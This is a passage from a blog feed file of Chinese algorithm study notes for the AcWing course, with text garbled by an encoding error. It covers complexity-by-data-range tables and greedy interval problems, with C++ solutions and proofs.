xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>10</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">n\le 10,000,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>åŒæŒ‡é’ˆæ‰«æã€kmpã€ACè‡ªåŠ¨æœºã€çº¿æ€§ç­›ç´ æ•°</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">n\le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msqrt><mi>n</mi></msqrt><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\sqrt n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0503em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8003em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="padding-left:0.833em;">n</span></span><span style="top:-2.7603em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2397em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>åˆ¤æ–­è´¨æ•°</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow><annotation encoding="application/x-tex">n\le 10^{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>åˆ¤æ–­è´¨æ•°æœ€å¤§å…¬çº¦æ•°ï¼Œå¿«é€Ÿå¹‚ï¼Œæ•°ä½DP</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>1000</mn></msup></mrow><annotation encoding="application/x-tex">n\le 10^{1000}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1000</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O((logn)^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">((</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>é«˜ç²¾åº¦åŠ å‡ä¹˜é™¤</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mrow><mn>1000</mn><mo separator="true">,</mo><mn>000</mn></mrow></msup></mrow><annotation encoding="application/x-tex">n\le 10^{1000,000}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1000</span><span class="mpunct mtight">,</span><span class="mord mtight">000</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo>Ã—</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logk\times loglogk)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span></td><td>kè¡¨ç¤ºä½æ•° ï¼Œé«˜ç²¾åº¦åŠ å‡ã€FFT/NTT</td></tr></tbody></table><p>å‚è€ƒï¼š</p><ol><li><p><a href="https://www.acwing.com/blog/content/32/">yxc.ç”±æ•°æ®èŒƒå›´åæ¨ç®—æ³•å¤æ‚åº¦ä»¥åŠç®—æ³•å†…å®¹</a></p></li><li><p><a href="https://www.acwing.com/blog/content/3398/">æ¾é¼ çˆ±è‘¡è„.ç¬¬ä¸ƒç«  æ—¶ç©ºå¤æ‚åº¦åˆ†æ ç¬”è®°</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
          <category> AcWingç®—æ³•åŸºç¡€è¯¾ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬6è®² è´ªå¿ƒ</title>
      <link href="/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-6-%E8%B4%AA%E5%BF%83/"/>
      <url>/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-6-%E8%B4%AA%E5%BF%83/</url>
      
        <content type="html"><![CDATA[<p>è´ªå¿ƒé¢˜å‹å›°éš¾ä¹‹å¤„åœ¨äº<strong>æ—¢æ— å›ºå®šæ¨¡æ¿</strong>ï¼Œ<strong>ä¹Ÿæ— å›ºå®šå¥—è·¯</strong>ã€‚<br>å¾€å¾€éœ€è¦å…ˆçŒœï¼ˆåšé¢˜ç»éªŒå¾ˆé‡è¦ï¼‰ï¼Œç„¶åè¯æ˜æ–¹æ³•çš„æ­£ç¡®æ€§ï¼ˆå¹³æ—¶é æ•°å­¦è¯æ˜ï¼Œç¬”è¯•é æäº¤ACå“ˆå“ˆå“ˆï¼‰</p><span id="more"></span><table><thead><tr><th><img src="/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-6-%E8%B4%AA%E5%BF%83/QQ_Image_1669642232353.jpg" alt></th><th><img src="/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-6-%E8%B4%AA%E5%BF%83/QQ_Image_1669642233841.jpg" alt></th></tr></thead></table><!--more--><h1 id="åŒºé—´é—®é¢˜">åŒºé—´é—®é¢˜</h1><h2 id="AcWing-905-åŒºé—´é€‰ç‚¹">AcWing 905. åŒºé—´é€‰ç‚¹</h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><h3 id="é¢˜ç›®æè¿°">é¢˜ç›®æè¿°</h3><p>ç»™å®šNä¸ªé—­åŒºé—´[ai,bi]ï¼Œè¯·ä½ åœ¨æ•°è½´ä¸Šé€‰æ‹©å°½é‡å°‘çš„ç‚¹ï¼Œä½¿å¾—æ¯ä¸ªåŒºé—´å†…è‡³å°‘åŒ…å«ä¸€ä¸ªé€‰å‡ºçš„ç‚¹ã€‚</p><p>è¾“å‡ºé€‰æ‹©çš„ç‚¹çš„æœ€å°æ•°é‡ã€‚</p><p>ä½äºåŒºé—´ç«¯ç‚¹ä¸Šçš„ç‚¹ä¹Ÿç®—ä½œåŒºé—´å†…ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•°Nï¼Œè¡¨ç¤ºåŒºé—´æ•°ã€‚</p><p>æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•°ai,biï¼Œè¡¨ç¤ºä¸€ä¸ªåŒºé—´çš„ä¸¤ä¸ªç«¯ç‚¹ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‰€éœ€çš„ç‚¹çš„æœ€å°æ•°é‡ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1â‰¤Nâ‰¤10^5,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><mi>a</mi><mi>i</mi><mo>â‰¤</mo><mi>b</mi><mi>i</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">âˆ’10^9â‰¤aiâ‰¤biâ‰¤10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">ai</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">bi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ ·ä¾‹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="operator">-</span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºæ ·ä¾‹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="è´ªå¿ƒ">è´ªå¿ƒ</h3><p><strong>åšæ³•</strong></p><ol><li>å°†æ¯ä¸ªåŒºé—´æŒ‰<code>å³ç«¯ç‚¹</code>ä»å°åˆ°å¤§æ’åº</li><li>ä»å‰å¾€åæšä¸¾æ¯ä¸ªåŒºé—´<br>è‹¥å·²åŒ…å«ç‚¹ï¼Œåˆ™pass<br>å¦åˆ™(<code>åŒºé—´å·¦ç«¯ç‚¹ &gt; è¯¥ç‚¹</code>)ï¼Œé€‰æ‹©å½“å‰åŒºé—´çš„å³æ–­ç«¯ç‚¹</li></ol><p><strong>è¯æ˜</strong>ï¼šæ±‚å¾—ç‚¹æ•°ä¸º<code>cnt</code>ï¼Œç­”æ¡ˆæ•°ä¸º<code>ans</code>ï¼Œå³è¯cnt = ans</p><ol><li><p>ans &lt;= cnt: æ–¹æ¡ˆå¯è¡Œï¼Œä¸”anså¯è¡Œæ–¹æ¡ˆä¸­æœ€å°ç‚¹æ•°çš„æ–¹æ¡ˆ</p></li><li><p>ans &gt;= cnt:</p><blockquote><p>ç‚¹åˆ†å¸ƒåœ¨cntä¸ªäº’ä¸è¿æ¥çš„åŒºé—´ä¸Šï¼Œè¦è¦†ç›–è¿™cntä¸ªåŒºé—´ï¼Œéœ€è¦çš„ç‚¹æ•°ans &gt;= åŒºé—´æ•°cnt</p></blockquote></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Range</span> &#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="comment">// åŠ¡å¿…æŒæ¡ ç»“æ„ä½“é‡è½½è¿ç®—ç¬¦ çš„å†™æ³•</span></span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Range &amp;W) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r &lt; W.r;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;ranges[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;ranges[i].l, &amp;ranges[i].r);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(ranges, ranges + n);  <span class="comment">// åˆ«å¿˜sort()</span></span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ed &lt; ranges[i].l) &#123;</span><br><span class="line">      res++;</span><br><span class="line">      ed = ranges[i].r;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-908-æœ€å¤§ä¸ç›¸äº¤åŒºé—´æ•°é‡">AcWing 908. æœ€å¤§ä¸ç›¸äº¤åŒºé—´æ•°é‡</h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><h3 id="é¢˜ç›®æè¿°-2">é¢˜ç›®æè¿°</h3><p>ç»™å®šNä¸ªé—­åŒºé—´[ai,bi]ï¼Œè¯·ä½ åœ¨æ•°è½´ä¸Šé€‰æ‹©è‹¥å¹²åŒºé—´ï¼Œä½¿å¾—é€‰ä¸­çš„åŒºé—´ä¹‹é—´äº’ä¸ç›¸äº¤ï¼ˆåŒ…æ‹¬ç«¯ç‚¹ï¼‰ã€‚</p><p>è¾“å‡ºå¯é€‰å–åŒºé—´çš„æœ€å¤§æ•°é‡ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•°Nï¼Œè¡¨ç¤ºåŒºé—´æ•°ã€‚</p><p>æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•°ai,biï¼Œè¡¨ç¤ºä¸€ä¸ªåŒºé—´çš„ä¸¤ä¸ªç«¯ç‚¹ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå¯é€‰å–åŒºé—´çš„æœ€å¤§æ•°é‡ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1â‰¤Nâ‰¤10^5,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><mi>a</mi><mi>i</mi><mo>â‰¤</mo><mi>b</mi><mi>i</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">âˆ’10^9â‰¤aiâ‰¤biâ‰¤10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">ai</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">bi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ ·ä¾‹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="operator">-</span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºæ ·ä¾‹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="è´ªå¿ƒ-2">è´ªå¿ƒ</h3><p>åšæ³•ä¸ä¸Šä¸€é¢˜ä¸€è‡´ã€‚</p><p>è¯æ˜ï¼š</p><ol><li><p>ans &gt;= cnt åšæ³•å¯è¡Œï¼Œä¸”ansä¸ºmaxçš„å¯è¡Œ</p></li><li><p>ans &lt;= 